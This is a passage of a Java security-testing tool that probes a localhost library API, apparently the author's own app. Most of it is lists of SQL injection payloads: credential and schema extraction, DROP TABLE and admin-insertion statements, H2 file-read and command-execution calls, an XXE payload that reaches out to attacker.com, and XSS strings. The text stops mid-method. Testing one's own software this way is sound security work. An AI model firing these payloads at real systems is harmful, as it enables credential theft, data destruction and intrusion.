/*
 * SecurityTester - Automated Security Testing Tool
 * Created by: George Papasotiriou
 * Date: 12/11/2025
 *
 * ENHANCED WITH DATABASE VULNERABILITY TESTING:
 * - SQL Injection with UNION attacks
 * - Database Schema Extraction
 * - Data Exfiltration
 * - Database Manipulation
 * - Stored Procedure Attacks
 * - Blind SQL Injection
 * - Time-based SQLi
 * - Database Error Information Disclosure
 * - Second-Order SQL Injection
 * - Type Confusion
 * - Path Traversal
 * - Authorization Bypass
 * - Input Validation
 * - Extreme Input Handling
 * - Enhanced SQL Injection (Database Extraction)
 * - JWT Token Vulnerabilities
 * - Business Logic Vulnerabilities
 */

package com.library;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.URLEncoder;
import java.util.*;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import java.time.Duration;
import java.time.LocalDateTime;

/**
 * COMPLETE Security Testing Tool with All Vulnerabilities
 * This tool tests various vulnerabilities in web services including database-specific tests
 */
public class SecurityTester {

    private static final String BASE_URL = "http://localhost:8080/api";
    private static String authToken = "";
    private static final HttpClient client = HttpClient.newBuilder()
            .version(HttpClient.Version.HTTP_1_1)
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    private static final List<String> SQL_KEYWORDS = Arrays.asList(
            "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER",
            "EXEC", "UNION", "JOIN", "FROM", "WHERE", "OR", "AND", "LIKE"
    );

    /**
     * Main method to run all security tests
     * Usage: java SecurityTester
     */
    public static void main(String[] args) {
        System.out.println("================================================");
        System.out.println("    COMPREHENSIVE API SECURITY TESTING TOOL");
        System.out.println("    Created by: George Papasotiriou");
        System.out.println("================================================");

        try {
            // Step 1: Test authentication
            if (!authenticate()) {
                System.out.println("\n⚠️  Trying alternative authentication method...");
                if (!registerAndLogin()) {
                    System.out.println("❌ All authentication attempts failed. Exiting.");
                    return;
                }
            }

            // Step 2: Run ALL vulnerability tests
            System.out.println("\n🚀 Starting Comprehensive Security Tests...");
            System.out.println("   Database: H2 File-based");
            System.out.println("   Location: ./data/librarydb.mv.db");

            // NEW DATABASE VULNERABILITY TESTS
            testDatabaseSchemaExtraction();
            testDataExfiltration();
            testDatabaseManipulation();
            testStoredProcedureAttacks();
            testBlindSqlInjection();
            testTimeBasedSqlInjection();
            testErrorBasedSqlInjection();
            testSecondOrderSqlInjection();
            testDatabaseErrorDisclosure();

            // ORIGINAL TESTS
            testSqlInjection();
            testEnhancedSqlInjection();
            testTypeConfusion();
            testPathTraversal();
            testAuthorizationBypass();
            testInputValidation();
            testExtremeInputs();
            testMassAssignment();
            testErrorHandling();
            testJwtVulnerabilities();
            testBusinessLogic();
            testPutEndpoint();
            testDeleteEndpoint();

            generateSecurityReport();

        } catch (Exception e) {
            System.err.println("Test failed with error: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Authenticate and get JWT token using admin credentials
     */
    private static boolean authenticate() throws IOException, InterruptedException {
        System.out.println("\n🔐 Testing Authentication...");

        // Test valid login with admin
        String json = "{\"username\":\"admin\",\"password\":\"password123\"}";

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(BASE_URL + "/auth/login"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

        System.out.println("   Login attempt with admin/password123");
        System.out.println("   Status Code: " + response.statusCode());

        if (response.statusCode() == 200) {
            // Extract token from response
            String body = response.body();
            if (body.contains("\"token\":")) {
                int start = body.indexOf("\"token\":\"") + 9;
                int end = body.indexOf("\"", start);
                authToken = body.substring(start, end);
                System.out.println("✅ Authentication successful!");
                System.out.println("   Token obtained: " + authToken.substring(0, Math.min(20, authToken.length())) + "...");
                return true;
            }
        }

        System.out.println("❌ Authentication failed with admin. Response: " +
                response.body().substring(0, Math.min(100, response.body().length())));
        return false;
    }

    /**
     * Alternative: Register a new user and login
     */
    private static boolean registerAndLogin() throws IOException, InterruptedException {
        System.out.println("\n🔐 Attempting to register new user...");

        // Register a new user
        String registerJson = "{\"username\":\"tester\",\"password\":\"test123\",\"role\":\"USER\"}";

        HttpRequest registerRequest = HttpRequest.newBuilder()
                .uri(URI.create(BASE_URL + "/auth/register"))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(registerJson))
                .build();

        HttpResponse<String> registerResponse = client.send(registerRequest, HttpResponse.BodyHandlers.ofString());

        if (registerResponse.statusCode() == 200 || registerResponse.body().contains("success")) {
            System.out.println("✅ User registered successfully");

            // Now login with the new user
            String loginJson = "{\"username\":\"tester\",\"password\":\"test123\"}";

            HttpRequest loginRequest = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/auth/login"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(loginJson))
                    .build();

            HttpResponse<String> loginResponse = client.send(loginRequest, HttpResponse.BodyHandlers.ofString());

            if (loginResponse.statusCode() == 200) {
                String body = loginResponse.body();
                if (body.contains("\"token\":")) {
                    int start = body.indexOf("\"token\":\"") + 9;
                    int end = body.indexOf("\"", start);
                    String userToken = body.substring(start, end);
                    authToken = userToken;  // Use the user token for testing
                    System.out.println("✅ Login with new user successful!");
                    System.out.println("   Token obtained: " + authToken.substring(0, Math.min(20, authToken.length())) + "...");
                    return true;
                }
            }
        }

        System.out.println("❌ Registration/login failed");
        return false;
    }

    /**
     * NEW: Test Database Schema Extraction
     */
    private static void testDatabaseSchemaExtraction() {
        System.out.println("\n📊 Testing Database Schema Extraction...");

        List<String> schemaPayloads = Arrays.asList(
                // H2 specific information schema queries
                "' UNION SELECT table_name,column_name,'dummy','dummy',true FROM information_schema.columns --",
                "' UNION SELECT 1,table_schema,'dummy','dummy',true FROM information_schema.tables --",
                "' UNION SELECT 1,column_type,'dummy','dummy',true FROM information_schema.columns WHERE table_name='USERS' --",
                // Extract all tables
                "' UNION SELECT 1,table_name,'3','4',true FROM information_schema.tables WHERE table_schema='PUBLIC' --",
                // Extract constraints
                "' UNION SELECT 1,constraint_name,'dummy','dummy',true FROM information_schema.constraints --"
        );

        Map<String, List<String>> extractedData = new HashMap<>();

        for (String payload : schemaPayloads) {
            try {
                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                if (response.statusCode() == 200) {
                    String body = response.body();

                    // Extract database structure information
                    extractDatabaseInfo(body, "TABLE_NAME", extractedData);
                    extractDatabaseInfo(body, "COLUMN_NAME", extractedData);
                    extractDatabaseInfo(body, "CONSTRAINT", extractedData);

                    // Check for specific table names
                    if (body.contains("USERS") || body.contains("BOOKS") || body.contains("BORROW_RECORDS")) {
                        System.out.println("   ⚠️  Database schema information leaked!");
                        System.out.println("   Payload: " + payload.substring(0, Math.min(80, payload.length())));
                        System.out.println("   Found tables: " +
                                (body.contains("USERS") ? "USERS " : "") +
                                (body.contains("BOOKS") ? "BOOKS " : "") +
                                (body.contains("BORROW_RECORDS") ? "BORROW_RECORDS" : ""));
                    }
                }

                Thread.sleep(300);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }

        // Display extracted schema
        if (!extractedData.isEmpty()) {
            System.out.println("   📋 Extracted Database Schema:");
            for (Map.Entry<String, List<String>> entry : extractedData.entrySet()) {
                System.out.println("     " + entry.getKey() + ": " + entry.getValue());
            }
        }
    }

    /**
     * NEW: Test Data Exfiltration
     */
    private static void testDataExfiltration() {
        System.out.println("\n🕵️  Testing Data Exfiltration...");

        // Try to extract user credentials
        List<String> exfiltrationPayloads = Arrays.asList(
                // Extract all users with passwords
                "' UNION SELECT id,username,password,role,true FROM users --",
                // Extract admin credentials specifically
                "' UNION SELECT 1,username,password,'admin',true FROM users WHERE role='ROLE_ADMIN' --",
                // Extract books with all details
                "' UNION SELECT id,title,author,isbn,available FROM books --",
                // Extract borrow records
                "' UNION SELECT br.id,u.username,b.title,br.borrow_date,true FROM borrow_records br JOIN users u ON br.user_id=u.id JOIN books b ON br.book_id=b.id --"
        );

        int credentialsFound = 0;

        for (String payload : exfiltrationPayloads) {
            try {
                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                if (response.statusCode() == 200) {
                    String body = response.body();

                    // Look for password hashes
                    if (body.contains("$2a$") || body.contains("$2b$") || body.contains("$2y$")) {
                        credentialsFound++;
                        System.out.println("   🔓 CRITICAL: Password hashes found in response!");
                        System.out.println("   Payload: " + payload.substring(0, Math.min(60, payload.length())));

                        // Extract and display found credentials
                        Pattern pattern = Pattern.compile("\"username\":\"([^\"]+)\".*?\"author\":\"([^\"$]*\\$[^\"]+)\"");
                        Matcher matcher = pattern.matcher(body);
                        while (matcher.find()) {
                            System.out.println("     User: " + matcher.group(1));
                            System.out.println("     Hash: " + matcher.group(2).substring(0, Math.min(30, matcher.group(2).length())) + "...");
                        }
                    }

                    // Look for sensitive data patterns
                    if (body.contains("admin") && body.contains("@") || body.contains("ROLE_ADMIN")) {
                        System.out.println("   ⚠️  Admin user information exposed!");
                    }
                }

                Thread.sleep(400);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }

        if (credentialsFound > 0) {
            System.out.println("   ❌ CRITICAL VULNERABILITY: " + credentialsFound + " sets of credentials extracted!");
        }
    }

    /**
     * NEW: Test Database Manipulation
     */
    private static void testDatabaseManipulation() {
        System.out.println("\n💥 Testing Database Manipulation...");

        List<String> manipulationPayloads = Arrays.asList(
                // Attempt to insert a new user
                "'; INSERT INTO users (username, password, role) VALUES ('hacker', 'hacked', 'ROLE_ADMIN'); --",
                // Attempt to update admin password
                "'; UPDATE users SET password='$2a$10$hacked' WHERE username='admin'; --",
                // Attempt to delete data
                "'; DELETE FROM books WHERE id=1; --",
                // Attempt to drop tables
                "'; DROP TABLE users; --",
                "'; DROP TABLE books; --",
                // Create a new table
                "'; CREATE TABLE hacked (id INT, data VARCHAR(255)); --",
                // Grant privileges (H2 specific)
                "'; GRANT ALL ON users TO PUBLIC; --"
        );

        int successfulManipulations = 0;

        for (String payload : manipulationPayloads) {
            try {
                LocalDateTime startTime = LocalDateTime.now();

                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .timeout(Duration.ofSeconds(5))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                LocalDateTime endTime = LocalDateTime.now();
                Duration duration = Duration.between(startTime, endTime);

                System.out.println("   Payload: " + payload.substring(0, Math.min(50, payload.length())) + "...");
                System.out.println("   Status: " + response.statusCode());
                System.out.println("   Response time: " + duration.toMillis() + "ms");

                // Check for successful manipulation indicators
                if (response.statusCode() != 200 || duration.toMillis() > 2000) {
                    System.out.println("   ⚠️  Possible database manipulation successful!");
                    successfulManipulations++;

                    // Verify by checking if data was modified
                    if (payload.contains("INSERT") || payload.contains("UPDATE")) {
                        verifyDatabaseState(payload);
                    }
                }

                Thread.sleep(500); // Longer delay for destructive tests

            } catch (Exception e) {
                System.out.println("   Error/Timeout: Possible successful manipulation!");
                successfulManipulations++;
            }
        }

        if (successfulManipulations > 0) {
            System.out.println("   ⚠️  " + successfulManipulations + " potential database manipulations detected!");
        }
    }

    /**
     * NEW: Test Stored Procedure Attacks
     */
    private static void testStoredProcedureAttacks() {
        System.out.println("\n⚙️  Testing Stored Procedure/Function Attacks...");

        List<String> procedurePayloads = Arrays.asList(
                // Attempt to call system functions
                "'; CALL SYSTEM_RUN('cmd.exe'); --",
                "'; SELECT SYSTEM_USER(); --",
                "'; SELECT CURRENT_USER(); --",
                // H2 specific functions
                "'; SELECT FILE_READ('C:/Windows/System32/drivers/etc/hosts'); --",
                "'; CALL CSVWRITE('C:/hacked.csv', 'SELECT * FROM users'); --",
                // Attempt to execute arbitrary SQL
                "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --"
        );

        for (String payload : procedurePayloads) {
            try {
                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Payload: " + payload.substring(0, Math.min(40, payload.length())) + "...");
                System.out.println("   Status: " + response.statusCode());

                // Check for system information in response
                String body = response.body();
                if (body.contains("SYSTEM_USER") || body.contains("CURRENT_USER") ||
                        body.contains("ADMIN") || body.contains("SA")) {
                    System.out.println("   ⚠️  System information exposed!");
                }

                Thread.sleep(300);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }
    }

    /**
     * NEW: Test Blind SQL Injection
     */
    private static void testBlindSqlInjection() {
        System.out.println("\n👁️  Testing Blind SQL Injection...");

        // Boolean-based blind SQLi
        List<String> blindPayloads = Arrays.asList(
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10 --",
                "' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
                "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 50 --"
        );

        Map<String, Boolean> testResults = new HashMap<>();

        for (String payload : blindPayloads) {
            try {
                LocalDateTime startTime = LocalDateTime.now();

                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                LocalDateTime endTime = LocalDateTime.now();
                Duration duration = Duration.between(startTime, endTime);

                boolean conditionTrue = response.body().contains("\"books\":[") &&
                        response.body().length() > 50;

                testResults.put(payload, conditionTrue);

                System.out.println("   Payload: " + payload);
                System.out.println("   Condition true: " + conditionTrue);
                System.out.println("   Response time: " + duration.toMillis() + "ms");

                Thread.sleep(300);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }

        // Analyze blind SQLi results
        if (testResults.get("' AND 1=1 --") && !testResults.get("' AND 1=2 --")) {
            System.out.println("   ⚠️  Blind SQL Injection possible!");
        }
    }

    /**
     * NEW: Test Time-Based SQL Injection
     */
    private static void testTimeBasedSqlInjection() {
        System.out.println("\n⏱️  Testing Time-Based SQL Injection...");

        List<String> timePayloads = Arrays.asList(
                // H2 sleep function
                "'; CALL SLEEP(3000); --",
                "'; SELECT * FROM books WHERE SLEEP(3)=0; --",
                // Conditional time delays
                "' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0) --",
                "' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(3) ELSE 0 END FROM users LIMIT 1) --"
        );

        for (String payload : timePayloads) {
            try {
                LocalDateTime startTime = LocalDateTime.now();

                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .timeout(Duration.ofSeconds(10))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                LocalDateTime endTime = LocalDateTime.now();
                Duration duration = Duration.between(startTime, endTime);

                System.out.println("   Payload: " + payload.substring(0, Math.min(40, payload.length())) + "...");
                System.out.println("   Response time: " + duration.toMillis() + "ms");

                if (duration.toMillis() > 2500) {
                    System.out.println("   ⚠️  TIME-BASED SQL INJECTION DETECTED!");
                }

                Thread.sleep(2000); // Wait between tests

            } catch (Exception e) {
                System.out.println("   Error/Timeout: " + e.getMessage());
            }
        }
    }

    /**
     * NEW: Test Error-Based SQL Injection
     */
    private static void testErrorBasedSqlInjection() {
        System.out.println("\n🚨 Testing Error-Based SQL Injection...");

        List<String> errorPayloads = Arrays.asList(
                // Generate divide by zero error
                "' AND 1/0=1 --",
                // Casting errors
                "' AND CAST('test' AS INT)=1 --",
                // Invalid syntax
                "' AND 1=('test' --",
                // Type mismatch
                "' AND (SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/\"> %remote;]>'),'/l') FROM dual) IS NOT NULL --"
        );

        int errorsFound = 0;

        for (String payload : errorPayloads) {
            try {
                String encodedPayload = URLEncoder.encode(payload, "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Payload: " + payload);
                System.out.println("   Status: " + response.statusCode());

                String body = response.body();
                if (body.contains("Exception") || body.contains("SQL") ||
                        body.contains("syntax") || body.contains("divide") ||
                        body.contains("cast") || body.contains("type") ||
                        body.toLowerCase().contains("error")) {
                    System.out.println("   ⚠️  SQL Error exposed: " +
                            body.substring(0, Math.min(100, body.length())).replace("\n", " "));
                    errorsFound++;
                }

                Thread.sleep(300);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }

        if (errorsFound > 0) {
            System.out.println("   ⚠️  " + errorsFound + " SQL errors exposed - Information disclosure!");
        }
    }

    /**
     * NEW: Test Second-Order SQL Injection
     */
    private static void testSecondOrderSqlInjection() {
        System.out.println("\n🔄 Testing Second-Order SQL Injection...");

        // Test if user input stored in database is later executed
        List<String> secondOrderPayloads = Arrays.asList(
                "admin' -- ",
                "'; UPDATE users SET role='ROLE_ADMIN' WHERE username='alice'; --",
                "test' OR '1'='1"
        );

        for (String payload : secondOrderPayloads) {
            try {
                // First, try to store the payload in the database
                String registerJson = String.format(
                        "{\"username\":\"secondorder_%d\",\"password\":\"%s\",\"role\":\"USER\"}",
                        System.currentTimeMillis() % 1000,
                        payload
                );

                HttpRequest registerRequest = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/auth/register"))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(registerJson))
                        .build();

                HttpResponse<String> registerResponse = client.send(registerRequest, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Stored payload: " + payload.substring(0, Math.min(30, payload.length())) + "...");
                System.out.println("   Register status: " + registerResponse.statusCode());

                // Then try to trigger the stored payload
                if (registerResponse.statusCode() == 200) {
                    Thread.sleep(1000);

                    // Search for the payload to trigger execution
                    HttpRequest triggerRequest = HttpRequest.newBuilder()
                            .uri(URI.create(BASE_URL + "/search?q=" + URLEncoder.encode("secondorder", "UTF-8")))
                            .header("Authorization", "Bearer " + authToken)
                            .GET()
                            .build();

                    HttpResponse<String> triggerResponse = client.send(triggerRequest, HttpResponse.BodyHandlers.ofString());

                    System.out.println("   Trigger status: " + triggerResponse.statusCode());

                    // Check for unexpected behavior
                    if (triggerResponse.body().contains("error") ||
                            triggerResponse.body().contains("Exception") ||
                            triggerResponse.body().contains("SQL")) {
                        System.out.println("   ⚠️  Possible second-order SQL injection!");
                    }
                }

                Thread.sleep(500);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }
    }

    /**
     * NEW: Test Database Error Information Disclosure
     */
    private static void testDatabaseErrorDisclosure() {
        System.out.println("\n📢 Testing Database Error Information Disclosure...");

        // Try to trigger various database errors
        Map<String, String> errorTests = new HashMap<>();
        errorTests.put("Invalid table", "' FROM nonexistent_table --");
        errorTests.put("Invalid column", "' UNION SELECT nonexistent_column FROM books --");
        errorTests.put("Syntax error", "' SYNTAX ERROR --");
        errorTests.put("Type mismatch", "' UNION SELECT 1,2,3,4,5 FROM books --"); // Wrong column count

        int disclosures = 0;

        for (Map.Entry<String, String> test : errorTests.entrySet()) {
            try {
                String encodedPayload = URLEncoder.encode(test.getValue(), "UTF-8");
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                String body = response.body();
                boolean disclosed = false;

                // Check for database-specific error messages
                if (body.contains("SQLState") || body.contains("SQLCODE") ||
                        body.contains("syntax error") || body.contains("Table") ||
                        body.contains("Column") || body.contains("does not exist") ||
                        body.contains("H2 Database")) {
                    disclosed = true;
                    disclosures++;
                }

                System.out.println("   Test: " + test.getKey());
                System.out.println("   Error disclosed: " + disclosed);

                if (disclosed) {
                    System.out.println("   ⚠️  Database error details exposed!");
                    System.out.println("   Sample: " + body.substring(0, Math.min(120, body.length())).replace("\n", " "));
                }

                Thread.sleep(300);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }

        if (disclosures > 0) {
            System.out.println("   ⚠️  " + disclosures + " types of database errors disclosed!");
        }
    }

    /**
     * Test SQL Injection vulnerabilities
     */
    private static void testSqlInjection() {
        System.out.println("\n💉 Testing Basic SQL Injection...");

        List<String> sqlInjectionPayloads = Arrays.asList(
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' UNION SELECT null,username,password,null FROM users --",
                "'; DROP TABLE books; --",
                "' OR 'a'='a",
                "' OR 1=1 --",
                "admin' --",
                "1' OR '1'='1",
                "' OR EXISTS(SELECT * FROM users) AND '1'='1"
        );

        for (String payload : sqlInjectionPayloads) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + payload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Payload: " + payload);
                System.out.println("   Status: " + response.statusCode());
                System.out.println("   Response length: " + response.body().length());

                // Check for signs of SQL injection success
                if (response.body().contains("\"books\":[")) {
                    try {
                        // Count how many books were returned
                        String body = response.body();
                        int bookCount = 0;
                        int index = body.indexOf("\"books\":[");
                        if (index != -1) {
                            String booksSection = body.substring(index + 8);
                            bookCount = countOccurrences(booksSection, "\"id\":");
                        }

                        if (bookCount > 4) { // More than initial 4 books
                            System.out.println("   ⚠️  POSSIBLE SQL INJECTION! Returned " + bookCount + " books");
                        }
                    } catch (Exception e) {
                        // Ignore parsing errors
                    }
                }

                Thread.sleep(100); // Small delay between requests

            } catch (Exception e) {
                System.out.println("   Error with payload '" + payload + "': " + e.getMessage());
            }
        }
    }

    /**
     * Test Enhanced SQL Injection Testing with Database Extraction
     */
    private static void testEnhancedSqlInjection() {
        System.out.println("\n💉💥 ENHANCED SQL Injection Testing...");

        // Database extraction payloads
        List<String> dbExtractionPayloads = Arrays.asList(
                // Extract all users (correct column count: 5)
                "' UNION SELECT id,username,password,'dummy_isbn',true FROM users --",

                // Extract database schema (H2 specific)
                "' UNION SELECT 1,table_name,'dummy','dummy',true FROM information_schema.tables --",

                // Extract columns of users table
                "' UNION SELECT 1,column_name,'dummy','dummy',true FROM information_schema.columns WHERE table_name='USERS' --",

                // Blind SQL injection tests
                "' AND (SELECT COUNT(*) FROM users) > 0 --",
                "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 10 --",

                // Time-based blind SQLi (if supported)
                "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE '%') > 0 AND SLEEP(5) --",

                // Database version extraction
                "' UNION SELECT 1,@@version,'dummy','dummy',true --"
        );

        for (String payload : dbExtractionPayloads) {
            try {
                // URL encode the payload
                String encodedPayload = URLEncoder.encode(payload, "UTF-8");

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/search?q=" + encodedPayload))
                        .header("Authorization", "Bearer " + authToken)
                        .GET()
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("\n   Payload: " + payload.substring(0, Math.min(50, payload.length())) + "...");
                System.out.println("   Status: " + response.statusCode());
                System.out.println("   Response length: " + response.body().length());

                // Analyze response for sensitive data
                String body = response.body();
                if (body.contains("admin") || body.contains("password") || body.contains("$2a$")) {
                    System.out.println("   ⚠️  CRITICAL: User credentials found in response!");

                    // Extract and display found credentials
                    if (body.contains("username")) {
                        System.out.println("   Extracted data:");
                        // Simple extraction logic
                        int start = body.indexOf("\"books\":[");
                        if (start != -1) {
                            String booksSection = body.substring(start);
                            String[] books = booksSection.split("\\},\\{");
                            for (String book : books) {
                                if (book.contains("username")) {
                                    System.out.println("     " + extractValue(book, "username"));
                                    System.out.println("     " + extractValue(book, "password"));
                                }
                            }
                        }
                    }
                }

                Thread.sleep(200);

            } catch (Exception e) {
                System.out.println("   Error: " + e.getMessage());
            }
        }
    }

    /**
     * NEW: Test PUT endpoint with various inputs
     */
    private static void testPutEndpoint() {
        System.out.println("\n🔄 Testing PUT Endpoint (Update Book)...");

        // First, get a book ID to test with
        Long bookId = getFirstBookId();
        if (bookId == null) {
            System.out.println("   ⚠️  No books found to test PUT endpoint");
            return;
        }

        List<Map<String, Object>> testCases = new ArrayList<>();

        // Test case 1: Normal update
        Map<String, Object> case1 = new HashMap<>();
        case1.put("title", "Updated Title");
        case1.put("author", "Updated Author");
        case1.put("isbn", "999-999-999");
        case1.put("available", true);
        testCases.add(case1);

        // Test case 2: XSS and SQL injection in fields
        Map<String, Object> case2 = new HashMap<>();
        case2.put("title", "<script>alert('XSS')</script>");
        case2.put("author", "Author'); DROP TABLE books; --");
        case2.put("isbn", "123' OR '1'='1");
        testCases.add(case2);

        // Test case 3: Extremely long values
        Map<String, Object> case3 = new HashMap<>();
        case3.put("title", "A".repeat(1000));
        case3.put("author", "B".repeat(1000));
        case3.put("isbn", "C".repeat(100));
        testCases.add(case3);

        // Test case 4: Invalid data types
        Map<String, Object> case4 = new HashMap<>();
        case4.put("title", 12345);  // Number instead of string
        case4.put("author", true);  // Boolean instead of string
        case4.put("available", "not_a_boolean");  // String instead of boolean
        testCases.add(case4);

        // Test case 5: Empty fields
        Map<String, Object> case5 = new HashMap<>();
        case5.put("title", "");
        case5.put("author", "");
        case5.put("isbn", "");
        testCases.add(case5);

        for (int i = 0; i < testCases.size(); i++) {
            Map<String, Object> testCase = testCases.get(i);
            try {
                String json = buildJson(testCase);

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books/" + bookId))
                        .header("Authorization", "Bearer " + authToken)
                        .header("Content-Type", "application/json")
                        .PUT(HttpRequest.BodyPublishers.ofString(json))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("   Test case " + (i + 1) + ": " + testCase);
                System.out.println("   Status: " + response.statusCode());

                if (response.statusCode() == 403) {
                    System.out.println("   ⚠️  Authorization required (admin only)");
                } else {
                    System.out.println("   Response: " + response.body().substring(0, Math.min(100, response.body().length())));
                }

                Thread.sleep(200);

            } catch (Exception e) {
                System.out.println("   Error with test case " + (i + 1) + ": " + e.getMessage());
            }
        }

        // Test type confusion in path parameter
        testPutTypeConfusion();
    }

    /**
     * NEW: Test PUT endpoint with type confusion in ID parameter
     */
    private static void testPutTypeConfusion() {
        System.out.println("\n   🔢 Testing PUT Type Confusion (Invalid IDs)...");

        List<String> invalidIds = Arrays.asList(
                "abc",          // String instead of number
                "-1",           // Negative number
                "0",            // Zero (likely invalid)
                "999999999999999999999999999999",  // Very large number
                "1.5",          // Float instead of integer
                "1; DROP TABLE books; --",  // SQL in ID
                "<script>alert(1)</script>",  // XSS in ID
                "null",         // null string
                "true",         // boolean
                "' OR '1'='1"   // SQL injection in ID
        );

        for (String id : invalidIds) {
            try {
                String json = "{\"title\":\"Test\",\"author\":\"Test\",\"isbn\":\"123\"}";

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(BASE_URL + "/books/" + id))
                        .header("Authorization", "Bearer " + authToken)
                        .header("Content-Type", "application/json")
                        .PUT(HttpRequest.BodyPublishers.ofString(json))
                        .build();

                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

                System.out.println("     ID: " + id);
                System.out.println("     Status: " + response.statusCode());

                // Check for error messages that reveal too much information
                String body = response.body();
                if (body.contains("Exception") || body.contains("SQL") ||
                        body.contains("syntax") || body.contains("NumberFormatException")) {
                    System.out.println("     ⚠️  INFORMATION DISCLOSURE: " +
                            body.substring(0, Math.min(80, body.length())).replace("\n", " "));
                }

                Thread.sleep(100);

            } catch (Exception e) {
                System.out.println("     Error with ID '" + id + "': " + e.getMessage());
            }
        }
    }

    /**
     * NEW: Test DELETE endpoint with various inputs
     */
    private static void testDeleteEndpoint() {
        System.out.println("\n🗑️  Testing DELETE Endpoint...");

        // First, create a test book to delete
        Long testBookId = createTestBook();
        if (testBookId == null) {
            System.out.println("   ⚠️  Could not create test book for DELETE testing");
            return;
        }

        // Test 1: Normal delete
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(BASE_URL + "/books/" + testBookId))
                    .header("Authorization", "Bearer " + authToken)
                    .DELETE()
                    .build();

